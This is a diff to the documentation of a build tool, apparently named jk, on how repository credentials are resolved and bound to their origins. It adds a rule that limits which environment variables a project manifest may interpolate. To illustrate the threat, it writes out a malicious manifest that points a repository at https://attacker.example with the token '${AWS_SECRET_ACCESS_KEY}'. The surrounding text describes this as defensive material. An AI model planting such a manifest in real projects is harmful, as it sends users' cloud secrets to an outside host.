@@ -7,8 +7,8 @@ jk repo login | logout | search | refresh
 
 Credentials: env, `jk repo login`, or Maven `settings.xml` — see [Credentials](#credentials) for
 the order and for why a credential only travels to the origin its name is bound to. Prefer
-`${VAR}` references over secrets in TOML. Corporate mirrors, forge package registries, S3/MinIO, and GCS are
-supported. After lock, a digest-matching file in the Maven local repository is used in
+`${VAR}` references in your own `~/.jk/config.toml` over secrets in TOML. Corporate mirrors, forge
+package registries, S3/MinIO, and GCS are supported. After lock, a digest-matching file in the Maven local repository is used in
 place; otherwise `JK_STORE_DIR/repos/<name>/`. Set `[m2] integration = false` to keep
 third-party jars only under the jk store. `jk install` writes the Maven local repo
 when `[m2] install` is on (default); `[m2] install = false` or `JK_M2_INSTALL=false`
@@ -96,7 +96,8 @@ usual.
 Sources, in order — the first that yields a credential wins:
 
 1. inline in the `[repositories.<id>]` table: `token`, or `username` + `password`, normally as
-   `${VAR}` references expanded when the repository is used
+   `${VAR}` references expanded when the repository is used — see [Who may write a
+   `${VAR}` reference](#who-may-write-a-var-reference)
 2. `JK_REPO_<ID>_TOKEN`, or `JK_REPO_<ID>_USERNAME` + `JK_REPO_<ID>_PASSWORD` — `<ID>` is the id
    upper-cased with every non-alphanumeric as `_` (`corp-nexus` → `CORP_NEXUS`)
 3. `jk repo login <id>` (stored under `~/.jk/creds/repo/`, owner-only)
@@ -132,8 +133,33 @@ https://s01.oss.sonatype.org, not https://attacker.example; …
 ```
 
 CI that exports `JK_REPO_INTERNAL_TOKEN` for a repository the project declares exports
-`JK_REPO_INTERNAL_HOST=repo.acme.com` beside it. Inline `${VAR}` credentials are not name-keyed
-and need no binding: the manifest that declares the URL declares the credential with it.
+`JK_REPO_INTERNAL_HOST=repo.acme.com` beside it.
+
+### Who may write a `${VAR}` reference
+
+An inline `${VAR}` reads your shell too, and which file wrote it decides whether it may:
+
+| Declared in | `${VAR}` may name |
+|-------------|-------------------|
+| `~/.jk/config.toml` | any variable — the file is yours, and its declaration supplies the credential even when the project declares the same id at the same origin |
+| a project `jk.toml` | only the repository's own `JK_REPO_<ID>_*` variables, sent under the same binding rule as the environment source above |
+
+A project manifest is anyone's: a cloned one declaring `[repositories.internal] url =
+"https://attacker.example/" token = "${AWS_SECRET_ACCESS_KEY}"` would otherwise receive that value in
+the `Authorization` header of its first resolve. So a project's reference to any other variable is
+refused, the repository is accessed anonymously, and jk warns once per run:
+
+```
+jk: warning: repository `internal` at https://attacker.example is accessed anonymously: its
+[repositories.internal] table interpolates ${AWS_SECRET_ACCESS_KEY}, and a project manifest may not
+read a variable of your shell into a credential — a cloned project could name any of them. To send
+one, declare [repositories.internal] with this URL and the ${VAR} reference in ~/.jk/config.toml,
+export JK_REPO_INTERNAL_TOKEN (or JK_REPO_INTERNAL_USERNAME + JK_REPO_INTERNAL_PASSWORD) with
+JK_REPO_INTERNAL_HOST=attacker.example, or run `jk repo login internal --url https://attacker.example/`.
+```
+
+A literal credential written into either file is that file's own secret and is used as written;
+committing one to a project is a leak of the project's secret, not of yours.
 
 ## Related
 
